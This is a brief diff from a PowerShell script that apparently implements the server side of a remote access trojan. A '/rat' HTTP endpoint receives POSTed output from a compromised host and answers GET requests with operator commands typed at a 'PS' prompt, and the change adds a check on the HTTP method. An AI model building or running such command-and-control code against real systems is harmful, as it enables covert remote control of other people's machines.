@@ -145,7 +145,7 @@ while ($true) {
     if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") ) { 
 		Receive-Request($request)	
 	}
-    if ($request.Url -match '/rat$' ) { # 
+    if ($request.Url -match '/rat$'  -and ($request.HttpMethod -eq "GET") ) { # 
         $response.ContentType = 'text/plain'
         $message = Read-Host "PS $hostip>"		
     }		
